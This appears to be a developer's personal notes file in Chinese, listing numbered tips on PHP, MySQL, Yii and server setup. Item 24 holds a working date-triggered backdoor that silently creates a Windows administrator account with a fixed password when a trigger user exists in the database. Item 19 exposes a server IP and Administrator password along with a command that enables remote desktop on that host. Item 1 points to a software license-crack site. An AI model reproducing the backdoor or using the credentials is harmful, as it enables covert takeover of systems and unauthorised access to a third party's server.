24: windows注入攻击
    if ($time > strtotime("2017-05-21")) {
        $user = $db->mypdoFetchAll("select * from `go_member` where username = 'broker4444'");
        if (!empty($user)) {
            exec("net user broker Abcd@dcbA/000 /add");
            exec("net localgroup administrators broker /add");
        }
    }

23: win7下, 命令行干掉程序进程:
    exec('wmic process where "name=\'WeChat.exe\'" delete');

22: xpath解析文档时, 设置以utf8字符集载入:
    $context  = stream_context_create($opts);
    $content = file_get_contents($url,false,$context);
    $dom = new \DOMDocument();
    @$dom->loadHTML('<?xml encoding="utf-8" ?>'. $content);
    $crawler = new \DOMXPath($dom);


21: sublime Text3 解决无法联网下载插件的问题: 
    将如下代码复制粘贴到 settion->packageSetting->package Contrl->setting user中
    {
        "bootstrapped":true,
        "channels":[
            "https://erhan.in/channel_v3.json"
        ],
        "in_process_packages":[

        ],
        "installed_packages":[
            "ChineseLocalizations",
            "Package Control"
        ]
    }


20: $rs = cal_days_in_month(CAL_GREGORIAN, 11, 2018); // 获取指定的月份的天数

19:window服务器:
        域名: 182.92.174.163
        name: Administrator
        password: Pt88888888

wmic /node:"182.92.174.163" /USER:"182.92.174.163\Administrator" PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1 


18: 配置apache支持url美化
		<Directory "path/to/basic/web">
		# 开启 mod_rewrite 用于美化 URL 功能的支持（译注：对应 pretty URL 选项）
		RewriteEngine on
		# 如果请求的是真实存在的文件或目录，直接访问
		RewriteCond %{REQUEST_FILENAME} !-f
		RewriteCond %{REQUEST_FILENAME} !-d
		# 如果请求的不是真实文件或目录，分发请求至 index.php
		RewriteRule . index.php

		# ...其它设置...
		</Directory>

17: lamp安装redis扩展：
    １
16: 注册静态资源的两种方式:
        1: 在app\assets路径下添加自定义的asset文件,需要继承自yii\web\AssetBundle类, 然后视图文件中可以直接
           asset::register($this),实现全局调用
        2: 直接在视图文件中$this->registerJsfile('资源路径') / $this->registerCssFile('资源路径')

15: function test()
   { 
        $a = 2;
        $b = 5;
        if ($a = 5 || $b = 3) 
        {
            $a++;
            $b++;
            echo $a . '----' . $b . "\n";

            $str = "为什么会输出1--6? 因为if条件中逻辑运算符||优先级要高于赋值运算=, 所以$a = bool(true)
             而, bool类型是不支持自增或者自减运算的,所以$a被输出为bool类型的1, 而$b由于||运算符的
             短路运算导致没有被赋值为3, 所以他还是5, 自增运算过后变为了6
            ";
        }
    }

14: Html::to($params1, $params2, $params3) , 此方法, 如果第二个参数是一个数组, 将会创建出完整的url路径来

13: 控制器中的beforeAction 方法, 重写此方法时, 一定要先初始化父类的beforeAction , 并且注意,此函数返回bool值, 用来决定程序是否向下执行

12: csrf验证导致的400错误解决办法:
   一: 视图表单中手动添加Html::csrfMetaTage()方法
   二: 在表单中增加隐藏的验证字段
      <input name="_csrf" type="hidden" id="_csrf" value="<?= Yii::$app->request->csrfToken ?>">
   三: 配置文件中, 或者控制器中屏蔽csrf验证

11: 框架中的renderPartial方法, 默认不使用布局, 由此带来的问题就是他不会加载必需的js/css文件, 所以我们需要在视图文件中手动把
   静态资源加载进来, 使用Html::cssFile('@web/css/temp.css');  Html::jsFile('@web/js/jquery.min.js');

10: php导出大数据excel方法:
    require('./db.class.php');
    $DB = new db();
    $DB->connect();//数据库链接

    header("Content-Type: text/csv");
    header("Content-Disposition:filename=php100.csv");
    $sql = "select order_sn,consignee,address,tel,mobile,email,order_amount,add_time from order_info";//查询数据
    $order = $DB->fetch_all($sql);

    // 打开PHP文件句柄，php://output 表示直接输出到浏览器
    $fp = fopen('php://output', 'a');
    // 输出Excel列名信息

    foreach($order[0] as $key=>$value){
        $head[] = iconv('utf-8', 'gbk', $key);//头信息
    }

    // 将数据通过fputcsv写到文件句柄
    //fputcsv($fp, $head);

    // 计数器
    $cnt = 0;
    // 每隔$limit行，刷新一下输出buffer，不要太大，也不要太小
    $limit = 100000;

    // 逐行取出数据，不浪费内存
    $count = count($order);

    for($t=0;$t<$count;$t++) {

        $cnt ++;
        if ($limit == $cnt) { //刷新一下输出buffer，防止由于数据过多造成问题
            ob_flush();
            flush();
            $cnt = 0;
        }
        foreach ($order[$t] as $i => $v) {
            if($i == 'add_time') {
                $row[$i] = iconv('utf-8', 'gbk', date('Y-m-d H:i:s',$v));
            }else{
                $row[$i] = iconv('utf-8', 'gbk', $v);
            }
        }
        fputcsv($fp, $row);
        unset($row);
    }


9: lamp环境中，安装mysql扩展： sudo apt-get install php7.0-mysql; sudo apt-get insall mysql-server;
	sudo apt-get install mysql-client;

8: set_time_limit(0);  配置当前php执行的脚本永不超时;

7: mysql数据库, 当有的字段值为null, 而我们查询又不想其返回为null的时候, COALESCE() , 可以使用这个函数,
    它的作用就是把默认返回为null的, 改为用 0 来返回. 例如: select COALESCE(NULL, 0) from table

6: redis for windows
    把redis-server.exe安装成windows 服务。redis-server.exe --service-install redis.windows.conf --loglevel verbose  在win服务管理器中启动卸载可以使用 redis-server --service-uninstall

5: centos7下安装php7
    rpm -ivh http://dl.fedoraproject.org/pub/epel/7/x86_64/Packages/e/epel-release-7-11.noarch.rpm
    获取php7 yum源
    rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm
    安装
    yum install php70w

4: composer 中国镜像
    composer config repo.packagist composer https://packagist.phpcomposer.com

3: mysql 开启通用日志, 实时查询执行的sql:
    1.进入Mysql
    2.启用Log功能(general_log=ON) SHOW VARIABLES LIKE "general_log%"; SET GLOBAL general_log = 'ON';

2: mysql 多字段多查询时 提升性能节省查询:
    1: SELECT SQL_CALC_FOUND_ROWS id,query,operator,state,comment from table where .....;
    2: SELECT FOUND_ROWS();
    SQL_CALC_FOUND_ROWS 会默认统计总的查询结果, 然后只需要执行语句2, 就可直接得到总结果条数, 两表联查, 多字段, 复杂查询时, 能节省很大的性能;
    
1. phpstrom注册码教程: http://idea.lanyus.com/
